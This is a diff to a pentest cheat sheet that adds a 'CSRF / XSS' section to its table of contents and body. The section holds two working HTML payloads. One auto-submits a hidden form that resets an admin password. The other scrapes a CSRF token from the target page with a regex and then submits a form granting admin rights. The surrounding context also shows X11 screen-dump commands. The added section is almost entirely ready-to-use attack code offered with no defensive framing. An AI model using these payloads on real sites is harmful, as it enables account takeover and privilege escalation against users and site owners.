@@ -56,6 +56,7 @@
 	- [PING](#ping)
 	- [TAR Wildcards](#tar-wildcards)
 	- [XAuthority / X11 dump](#xauthority--x11-dump)
+	- [CSRF / XSS](#csrf--xss)
 	- [Websites](#websites)
 
 ## Scan
@@ -592,6 +593,54 @@ xwd -root -screen -silent -display :0 -out dump
 
 ```bash
 xwud -in dump
+```
+
+## CSRF / XSS
+
+Exemple 1
+
+```html
+<html>
+  <body>
+    <form action="https://example.com/change_password.php" method="POST">
+      <input type="hidden" name="username" value="admin" />
+      <input type="hidden" name="password" value="newPassword123" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+```
+
+Exemple 2
+
+```html
+<form action="https://example.com/change_status.php" method="post" name="csrf_form" enctype="multipart/form-data">
+    <input id="username" type="text" name="username" value="sds">
+    <input id="admin" type="checkbox" name="admin" checked >
+    <input id="token" type="hidden" name="token" value="" />
+    <button type="submit">Submit</button>
+</form>
+
+<script>
+(function() {
+    let xhttp = new XMLHttpRequest();
+    xhttp.open("GET", "https://example.com/change_status.php", true);
+    xhttp.onreadystatechange = function() {
+        if (this.readyState === 4 && this.status === 200) {
+            let token_admin = this.responseText.match(/[abcdef0123456789]{32}/);
+            if (token_admin) {
+                document.getElementById('token').setAttribute('value', token_admin);
+                document.csrf_form.submit();
+            }
+        }
+    };
+    xhttp.send();
+})();
+</script>
 ```
 
 ## Websites
